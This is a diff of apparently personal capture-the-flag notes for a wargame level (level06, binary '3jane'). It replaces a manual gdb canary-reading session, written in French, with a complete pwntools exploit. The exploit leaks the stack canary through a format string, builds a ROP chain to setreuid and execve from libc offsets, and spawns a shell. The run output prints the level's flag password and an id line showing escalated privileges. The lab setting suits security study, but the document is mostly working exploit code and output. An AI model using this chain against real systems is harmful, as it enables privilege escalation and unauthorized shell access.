@@ -1,20 +1,6 @@
-FONCTIONNE MAIS GDB NE PEUT PAS OUVRIR LE SHELL ENSUITE, IL FAUT TROUVER UNE SOLUTION POUR RECUPERER 
-LE CANARY DEPUIS PYTHON
-
-(gdb) run < /tmp/payload
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-Starting program: /home/level06/3jane < /tmp/payload
-[Thread debugging using libthread_db enabled]
-Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-Breakpoint 1, 0x0000000000401664 in main ()
-(gdb) x/x $fs_base+0x28
-0x7ffff7fb4768:	0x37b7bc57c1091d00 <------- VOIR ************* il faut ajouter a la place de 'ICI AJOUTER'
-et ensuite on peut continuer: 'c'
-(gdb) c
-
-python3 -c "from pwn import *
-offset = 199
+level06@rainfall:~$ cat exploitend.py
+from pwn import *
+offset = 136
 libc            = 0x7ffff7c00000
 addr_execve     = libc + 0xef030
 addr_setreuid   = libc + 0x127370
@@ -26,8 +12,16 @@ pop_rdi         = libc + 0x10c08d
 pop_rsi         = libc + 0x10f889
 pop_rdx         = libc + 0xb513c
 
+p = process('./3jane')
+p.recvuntil(b'Request ID: ')
+p.sendline(b'%15$p')
+p.recvuntil(b'Logging: ')
+data = p.recvuntil(b'Access code: ')
+leak_line = data.split(b'\n')[0]
+canary = int(leak_line, 16)
+
 payload  = b'A' * offset
-payload += p64(*****************)
+payload += p64(canary)
 payload += b'B' * 8
 payload += p64(ret)
 
@@ -54,5 +48,13 @@ payload += p64(0)
 payload += p64(addr_execve)
 payload += p64(addr_exit)
 
-open('/tmp/payload','wb').write(payload)"
-"
+p.sendline(payload)
+p.interactive()
+level06@rainfall:~$ python3 exploitend.py 
+[+] Starting local process './3jane': pid 42449
+[*] Switching to interactive mode
+[3JANE] Access denied.
+$ cat /home/flag06/.pass
+c1t0kg9pklac7x4c7sn7iqgfppkz4usq
+$ id
+uid=1023(flag06) gid=1009(level06) groups=1009(level06),1001(levelgroup)
